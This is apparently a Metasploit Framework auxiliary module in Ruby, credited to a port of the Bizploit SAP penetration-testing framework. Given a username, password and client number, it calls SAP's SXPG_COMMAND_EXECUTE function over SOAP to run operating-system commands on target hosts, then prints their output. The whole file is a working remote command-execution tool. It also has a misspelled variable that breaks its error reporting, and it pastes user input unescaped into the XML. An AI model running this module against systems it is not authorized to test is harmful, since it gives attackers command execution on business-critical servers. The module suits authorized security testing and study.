##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

##
# This module is based on, inspired by, or is a port of a plugin available in 
# the Onapsis Bizploit Opensource ERP Penetration Testing framework - 
# http://www.onapsis.com/research-free-solutions.php.
# Mariano Nuñez (the author of the Bizploit framework) helped me in my efforts
# in producing the Metasploit modules and was happy to share his knowledge and
# experience - a very cool guy. I'd also like to thank Chris John Riley, 
# Ian de Villiers and Joris van de Vis who have Beta tested the modules and 
# provided excellent feedback. Some people just seem to enjoy hacking SAP :)
##

require 'msf/core'

class Metasploit4 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Scanner

	def initialize
		super(
			'Name' => 'SAP SOAP RFC SXPG_COMMAND_EXECUTE',
			'Version' => '$Revision: $0.1',
			'Description' => %q{
				This module makes use of the SXPG_COMMAND_EXECUTE Remote Function Call (via SOAP) to execute OS commands as configured in SM69.
				},
			'References' => [[ 'URL', 'http://labs.mwrinfosecurity.com' ]],
			'Author' => [ 'Agnivesh Sathasivam','nmonkee' ],
			'License' => BSD_LICENSE
			)
		register_options(
			[
				OptString.new('CLIENT', [true, 'Client', nil]),
				OptString.new('USER', [true, 'Username', nil]),
				OptString.new('PASS', [true, 'Password', nil]),
				OptString.new('CMD', [true, 'Command to be executed', nil]),
				OptString.new('PARAM', [false, 'Additional parameters', nil]),
				OptString.new('OS', [true, '1. ANYOS, 2. UNIX, 3. Windows NT, 4. AS/400, 5. OS/400', nil]),
			], self.class)
	end
	
	def run_host(ip)
		os = nil
		if datastore['OS']
			case(datastore['OS'])
				when '1'
					os = "ANYOS"
				when '2'
					os = "UNIX"
				when '3'
					os = 'Windows NT'
				when '4'
					os = 'AS/400'
				when '5'
					os = 'OS/400'
				else
					print_error "Invalid OS!"
			end
		end
	data = '<?xml version="1.0" encoding="utf-8" ?>'
	data << '<env:Envelope xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:env="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">'
	data << '<env:Body>'
	data << '<n1:SXPG_COMMAND_EXECUTE xmlns:n1="urn:sap-com:document:sap:rfc:functions" env:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">'
	if datastore['PARAM']
		data << '<ADDITIONAL_PARAMETERS>' + datastore['PARAM'] + ' </ADDITIONAL_PARAMETERS>'
	else
		data << '<ADDITIONAL_PARAMETERS> </ADDITIONAL_PARAMETERS>'
	end
	data << '<COMMANDNAME>' + datastore['CMD'] + '</COMMANDNAME>'
	data << '<OPERATINGSYSTEM>' + os + '</OPERATINGSYSTEM>'
	data << '<EXEC_PROTOCOL><item></item></EXEC_PROTOCOL>'
	data << '</n1:SXPG_COMMAND_EXECUTE>'
	data << '</env:Body>'
	data << '</env:Envelope>'
	user_pass = Rex::Text.encode_base64(datastore['USER'] + ":" + datastore['PASS'])
	print_status("#{ip}:#{datastore['RPORT']} - sending SOAP SXPG_COMMAND_EXECUTE request")
	begin
		res = send_request_raw({
			'uri' => '/sap/bc/soap/rfc?sap-client=' + datastore['CLIENT'] + '&sap-language=EN',
			'method' => 'POST',
			'data' => data,
			'headers' =>{
				'Content-Length' => data.size.to_s,
				'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions',
				'Cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],
				'Authorization' => 'Basic ' + user_pass,
				'Content-Type' => 'text/xml; charset=UTF-8',
				}
			}, 45)
		if (res.code != 500 and res.code != 200)
			# to do - implement error handlers for each status code, 404, 301, etc.
			print_error("#{ip}:#{datastore['RPORT']} - something went wrong!")
			return
		else
			success = true
			print_status("#{ip}:#{datastore['RPORT']} - got response")
			saptbl = Msf::Ui::Console::Table.new(
				Msf::Ui::Console::Table::Style::Default,
					'Header' => "[SAP] SXPG_COMMAND_EXECUTE ",
					'Prefix' => "\n",
					'Postfix' => "\n",
					'Indent'  => 1,
					'Columns' =>["Output",]
					)
			response = res.body
			if response =~ /faultstring/
				error = response.scan(%r{<faultstring>(.*?)</faultstring>}).flatten
				sucess = false
			end
			output = response.scan(%r{<MESSAGE>([^<]+)</MESSAGE>}).flatten
			for i in 0..output.length-1
				saptbl << [output[i]]
			end
		end
		rescue ::Rex::ConnectionError
			print_error("#{ip}:#{datastore['RPORT']} - Unable to connect")
			return
		end
		if success == true
			print(saptbl.to_s)
		end
		if sucess == false
			for i in 0..error.length-1
				print_error("#{ip}:#{datastore['RPORT']} - error #{error[i]}")
			end
		end
	end
end  
